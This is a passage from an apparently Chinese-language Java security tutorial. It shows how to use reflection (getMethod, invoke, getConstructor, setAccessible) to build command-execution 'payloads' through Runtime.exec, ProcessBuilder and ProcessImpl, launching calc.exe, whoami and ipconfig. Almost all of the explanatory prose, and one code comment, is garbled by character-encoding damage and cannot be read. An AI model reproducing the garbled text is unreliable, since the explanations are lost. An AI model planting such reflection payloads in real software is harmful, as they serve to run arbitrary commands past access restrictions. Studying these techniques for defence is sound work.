&#125;<br>&#125;<br><br><br><span class="hljs-comment">//private static TrainDB instance = new TrainDB(); </span><br><span class="hljs-comment">// â†‘ è¿™é‡Œåœ¨ç±»åŠ è½½æ—¶è‡ªåŠ¨è°ƒç”¨ç§æœ‰æ„é€ æ–¹æ³•</span><br><span class="hljs-comment">//è°ƒç”¨æ„é€ æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// æ­£ç¡®è·å–å®ä¾‹çš„æ–¹å¼</span><br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db1</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <span class="hljs-type">TrainDB</span> <span class="hljs-variable">db2</span> <span class="hljs-operator">=</span> TrainDB.getInstance();<br>        <br>        <span class="hljs-comment">// éªŒè¯ç¡®å®æ˜¯åŒä¸€ä¸ªå®ä¾‹</span><br>        System.out.println(db1 == db2); <span class="hljs-comment">// è¾“å‡º true</span><br>        <br>        <span class="hljs-comment">// é”™è¯¯å°è¯•ï¼ˆæ— æ³•ç¼–è¯‘ï¼‰ï¼š</span><br>        <span class="hljs-comment">// TrainDB db3 = new TrainDB();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ï¼Œåªæœ‰ç±»åˆå§‹åŒ–çš„æ—¶å€™ä¼šæ‰§è¡Œä¸€æ¬¡æ„é€ å‡½æ•°ï¼Œåé¢åªèƒ½é€šè¿‡ getInstance è·å–è¿™ä¸ªå¯¹è±¡ï¼Œé¿å…å»ºç«‹å¤šä¸ªæ•°æ®åº“è¿æ¥ã€‚</p><p>Runtimeç±»å°±æ˜¯å•ä¾‹æ¨¡å¼ï¼Œæˆ‘ä»¬åªèƒ½é€šè¿‡ Runtime.getRuntime() æ¥è·å–åˆ° Runtime å¯¹è±¡ã€‚æˆ‘ä»¬å°†ä¸Šè¿°Payloadè¿›è¡Œä¿®æ”¹å³å¯æ­£å¸¸æ‰§è¡Œå‘½ä»¤äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <br>String.class).invoke(clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(clazz), <br><span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getMethodæ–¹æ³•-å…¬æœ‰æ–¹æ³•"><a href="#getMethodæ–¹æ³•-å…¬æœ‰æ–¹æ³•" class="headerlink" title="getMethodæ–¹æ³•(å…¬æœ‰æ–¹æ³•)"></a>getMethodæ–¹æ³•(å…¬æœ‰æ–¹æ³•)</h3><p>getMethod çš„ä½œç”¨æ˜¯é€šè¿‡åå°„è·å–ä¸€ä¸ªç±»çš„æŸä¸ªç‰¹å®šçš„å…¬æœ‰æ–¹æ³•ã€‚Javaä¸­ æ”¯æŒç±»çš„é‡è½½ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…é€šè¿‡å‡½æ•°åæ¥ç¡®å®šä¸€ä¸ªå‡½æ•°ã€‚æ‰€ä»¥ï¼Œåœ¨è°ƒç”¨getMethodçš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ä¼ ç»™ä»–ä½ éœ€è¦è·å–çš„å‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨ã€‚</p><p>æ¯”å¦‚è¿™é‡Œçš„ Runtime.exec æ–¹æ³•æœ‰6ä¸ªé‡è½½ï¼š</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a01.png"></p><p>æˆ‘ä»¬ä½¿ç”¨ç¬¬ä¸€ä¸ªï¼Œå®ƒåªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œç±»å‹æ˜¯Stringï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ getMethod(â€œexecâ€, String.class) æ¥è·å– Runtime.exec æ–¹æ³•ã€‚</p><h3 id="invokeæ–¹æ³•"><a href="#invokeæ–¹æ³•" class="headerlink" title="invokeæ–¹æ³•"></a>invokeæ–¹æ³•</h3><p>invoke çš„ä½œç”¨æ˜¯æ‰§è¡Œæ–¹æ³•ï¼Œå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ï¼š </p><ul><li>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ </li><li>å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»</li></ul><p>è¿™ä¹Ÿæ¯”è¾ƒå¥½ç†è§£äº†ï¼Œæˆ‘ä»¬æ­£å¸¸æ‰§è¡Œæ–¹æ³•æ˜¯ [1].method([2], [3], [4]â€¦)ï¼Œå…¶å®åœ¨åå°„é‡Œå°±æ˜¯ method.invoke([1], [2], [3], [4]â€¦)ã€‚ æ‰€ä»¥æˆ‘ä»¬å°†ä¸Šè¿°å‘½ä»¤æ‰§è¡Œçš„Payloadåˆ†è§£ä¸€ä¸‹å°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Method</span> <span class="hljs-variable">execMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br><span class="hljs-type">Method</span> <span class="hljs-variable">getRuntimeMethod</span> <span class="hljs-operator">=</span> clazz.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> getRuntimeMethod.invoke(clazz);<br>execMethod.invoke(runtime, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="getConstructoræ–¹æ³•-æ„é€ å‡½æ•°"><a href="#getConstructoræ–¹æ³•-æ„é€ å‡½æ•°" class="headerlink" title="getConstructoræ–¹æ³•(æ„é€ å‡½æ•°)"></a>getConstructoræ–¹æ³•(æ„é€ å‡½æ•°)</h3><p>å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ</p><p>å’Œ getMethod ç±»ä¼¼ï¼Œ getConstructor æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œ æ‰€ä»¥å¿…é¡»ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°ã€‚</p><p>è·å–åˆ°æ„é€ å‡½æ•°åï¼Œæˆ‘ä»¬ä½¿ç”¨ newInstance æ¥æ‰§è¡Œã€‚ </p><p>æ¯”å¦‚ï¼Œæˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶åè°ƒç”¨ start() æ¥æ‰§è¡Œå‘½ä»¤ï¼š</p><p>ProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š</p><ul><li>public ProcessBuilder(List command) </li><li>public ProcessBuilder(Stringâ€¦ command)</li></ul><p>ä¸‹é¢ç”¨åˆ°äº†ç¬¬ä¸€ä¸ªå½¢å¼çš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥åœ¨ getConstructor çš„æ—¶å€™ä¼ å…¥çš„æ˜¯ List.class ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(<br>Arrays.asList(<span class="hljs-string">&quot;calc.exe&quot;</span>)));<br></code></pre></td></tr></table></figure><p>é€šè¿‡ getMethod(â€œstartâ€) è·å–åˆ°startæ–¹æ³•ï¼Œç„¶å invoke æ‰§è¡Œï¼Œ invoke çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯ ProcessBuilder Objectäº†ã€‚</p><h3 id="å¯å˜é•¿å‚æ•°-varargs"><a href="#å¯å˜é•¿å‚æ•°-varargs" class="headerlink" title="å¯å˜é•¿å‚æ•° varargs"></a>å¯å˜é•¿å‚æ•° varargs</h3><p>é‚£ä¹ˆï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ public ProcessBuilder(Stringâ€¦ command) è¿™ä¸ªæ„é€ å‡½æ•°ï¼Œéœ€è¦æ€æ ·ç”¨åå°„æ‰§è¡Œå‘¢ï¼Ÿ</p><p>è¿™åˆæ¶‰åŠåˆ°Javaé‡Œçš„å¯å˜é•¿å‚æ•°ï¼ˆvarargsï¼‰äº†ã€‚æ­£å¦‚å…¶ä»–è¯­è¨€ä¸€æ ·ï¼ŒJavaä¹Ÿæ”¯æŒå¯å˜é•¿å‚æ•°ï¼Œå°±æ˜¯å½“ä½ å®šä¹‰å‡½æ•°çš„æ—¶å€™ä¸ç¡®å®šå‚æ•°æ•°é‡çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨ â€¦ è¿™æ ·çš„è¯­æ³•æ¥è¡¨ç¤ºâ€œè¿™ä¸ªå‡½æ•°çš„å‚æ•°ä¸ªæ•°æ˜¯å¯å˜çš„â€ã€‚</p><p>å¯¹äºå¯å˜é•¿å‚æ•°ï¼ŒJavaå…¶å®åœ¨ç¼–è¯‘çš„æ—¶å€™ä¼šç¼–è¯‘æˆä¸€ä¸ªæ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚ä¸‹è¿™ä¸¤ç§å†™æ³•åœ¨åº•å±‚æ˜¯ç­‰ä»·çš„ï¼ˆä¹Ÿå°±ä¸èƒ½é‡è½½ï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String[] names)</span> &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">(String...names)</span> &#123;&#125;<br>-----<br>String[] names = &#123;<span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>&#125;;<br>hello(names);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯¹äºåå°„æ¥è¯´ï¼Œå¦‚æœè¦è·å–çš„ç›®æ ‡å‡½æ•°é‡ŒåŒ…å«å¯å˜é•¿å‚æ•°ï¼Œå…¶å®æˆ‘ä»¬è®¤ä¸ºå®ƒæ˜¯æ•°ç»„å°±è¡Œäº†ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å°†å­—ç¬¦ä¸²æ•°ç»„çš„ç±» String[].class ä¼ ç»™ getConstructor ï¼Œè·å– ProcessBuilder çš„ç¬¬äºŒç§æ„é€ å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getConstructor(String[].class)<br></code></pre></td></tr></table></figure><p>åœ¨è°ƒç”¨ newInstance çš„æ—¶å€™ï¼Œå› ä¸ºè¿™ä¸ªå‡½æ•°æœ¬èº«æ¥æ”¶çš„æ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼Œæˆ‘ä»¬ä¼ ç»™ ProcessBuilder çš„ä¹Ÿæ˜¯ä¸€ä¸ªå¯å˜é•¿å‚æ•°ï¼ŒäºŒè€…å åŠ ä¸ºä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥æ•´ä¸ªPayloadå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> <br><span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();<br></code></pre></td></tr></table></figure><p>å®Œå…¨åå°„ç¼–å†™</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(clazz.getConstructor(String[].class).newInstance(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[][]&#123;&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;&#125;));<br></code></pre></td></tr></table></figure><h3 id="getDeclared-ç³»åˆ—çš„åå°„"><a href="#getDeclared-ç³»åˆ—çš„åå°„" class="headerlink" title="getDeclared ç³»åˆ—çš„åå°„"></a>getDeclared ç³»åˆ—çš„åå°„</h3><p>å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ</p><p>getDeclared ç³»åˆ—çš„åå°„ï¼Œä¸æ™®é€šçš„ getMethod ã€ getConstructor åŒºåˆ«æ˜¯ï¼š</p><ul><li>getMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³• </li><li>getDeclaredMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®åœ¨å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†</li></ul><p>getDeclaredMethod çš„å…·ä½“ç”¨æ³•å’Œ getMethod ç±»ä¼¼ï¼Œ getDeclaredConstructor çš„å…·ä½“ç”¨æ³•å’Œ getConstructor ç±»ä¼¼</p><p>eg. Runtimeè¿™ä¸ªç±»çš„æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ Runtime.getRuntime() æ¥è·å–å¯¹è±¡ã€‚å…¶å®ç°åœ¨æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ getDeclaredConstructor æ¥è·å–è¿™ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>);<br><span class="hljs-type">Constructor</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor();<br>m.setAccessible(<span class="hljs-literal">true</span>);<br>clazz.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="hljs-string">&quot;calc.exe&quot;</span>);<br></code></pre></td></tr></table></figure><p>å¯è§ï¼Œè¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªæ–¹æ³• setAccessible ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬åœ¨è·å–åˆ°ä¸€ä¸ªç§æœ‰æ–¹æ³•åï¼Œå¿…é¡»ç”¨ setAccessible ä¿®æ”¹å®ƒçš„ä½œç”¨åŸŸï¼Œå¦åˆ™ä»ç„¶ä¸èƒ½è°ƒç”¨ã€‚</p><h2 id="Java-å‘½ä»¤æ‰§è¡Œçš„ä¸‰ç§æ–¹å¼"><a href="#Java-å‘½ä»¤æ‰§è¡Œçš„ä¸‰ç§æ–¹å¼" class="headerlink" title="Java å‘½ä»¤æ‰§è¡Œçš„ä¸‰ç§æ–¹å¼"></a>Java å‘½ä»¤æ‰§è¡Œçš„ä¸‰ç§æ–¹å¼</h2><h3 id="1-è°ƒç”¨-Runtime-ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"><a href="#1-è°ƒç”¨-Runtime-ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1. è°ƒç”¨ Runtime ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ"></a>1. è°ƒç”¨ Runtime ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// ä½¿ç”¨ Runtime ç±»è¿›è¡Œå‘½ä»¤æ‰§è¡Œ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//ï¿½ÊµÛµï¿½ï¿½Â»ï¿½\zhr_0</span><br></code></pre></td></tr></table></figure><ol><li>å…ˆè°ƒç”¨ getRuntime() è¿”å›ä¸€ä¸ª Runtime å¯¹è±¡ï¼Œç„¶åè°ƒç”¨ Runtime å¯¹è±¡çš„ exec çš„æ–¹æ³•ã€‚</li><li>è°ƒç”¨ Runtime å¯¹è±¡çš„ exec çš„æ–¹æ³•ä¼šè¿”å› Process å¯¹è±¡ï¼Œè°ƒç”¨ Process å¯¹è±¡çš„ getInputStream() æ–¹æ³•ã€‚</li><li>è°ƒç”¨ Process å¯¹è±¡çš„ getInputStream() æ–¹æ³•ï¼Œæ­¤æ—¶ï¼Œå­è¿›ç¨‹å·²ç»æ‰§è¡Œäº† whoami å‘½ä»¤ä½œä¸ºå­è¿›ç¨‹çš„è¾“å‡ºï¼Œå°†è¿™ä¸€æ®µè¾“å‡ºä½œä¸ºè¾“å…¥æµä¼ å…¥ inputStream</li></ol><p>æˆ‘ä»¬çš„ç¬¬ä¸€è¡Œå°±æ˜¯ç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤éœ€è¦å¾—åˆ°å‘½ä»¤çš„ç»“æœï¼Œæ‰€ä»¥éœ€è¦å°†ç»“æœå­˜å‚¨åˆ°å­—èŠ‚æ•°ç»„å½“ä¸­</p><p>è¿™ä¸€æ®µä»£ç ç”¨æ¥ä¿å­˜è¿è¡Œç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br><span class="hljs-comment">/** </span><br><span class="hljs-comment">* readLenç”¨äºå­˜å‚¨æ¯æ¬¡è¯»å–è¾“å…¥æµçš„é•¿åº¦</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br><span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache))!=-<span class="hljs-number">1</span>)&#123;  <br>    byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-ProcessBuilder"><a href="#2-ProcessBuilder" class="headerlink" title="2. ProcessBuilder"></a>2. ProcessBuilder</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br>  <br><span class="hljs-comment">// ä½¿ç”¨ ProcessBuilder è¿›è¡Œå‘½ä»¤æ‰§è¡Œæ“ä½œ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessBuilderExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;ipconfig&quot;</span>).start().getInputStream();  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br> <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br> &#125;  <br>        System.out.println(byteArrayOutputStream);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-ä½¿ç”¨-ProcessImpl"><a href="#3-ä½¿ç”¨-ProcessImpl" class="headerlink" title="3. ä½¿ç”¨ ProcessImpl"></a>3. ä½¿ç”¨ ProcessImpl</h3><p><code>ProcessImpl</code> æ˜¯æ›´ä¸ºåº•å±‚çš„å®ç°ï¼Œ<code>Runtime</code> å’Œ <code>ProcessBuilder</code> æ‰§è¡Œå‘½ä»¤å®é™…ä¸Šä¹Ÿæ˜¯è°ƒç”¨äº† <code>ProcessImpl</code> è¿™ä¸ªç±»ï¼Œå¯¹äº <code>ProcessImpl</code> ç±»æˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åå°„æ¥é—´æ¥è°ƒç”¨ <code>ProcessImpl</code> æ¥è¾¾åˆ°æ‰§è¡Œå‘½ä»¤çš„ç›®çš„ã€‚</p><ul><li>å› ä¸º ProcessImpl æ˜¯ç§æœ‰çš„æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br>  <br>  <br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Method;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// ä½¿ç”¨ ProcessImpl è¿›è¡Œå‘½ä»¤æ‰§è¡Œ  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProcessImplExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        String[] cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;;  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);  <br> <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class,  <br> ProcessBuilder.Redirect[].class, <span class="hljs-type">boolean</span>.class);  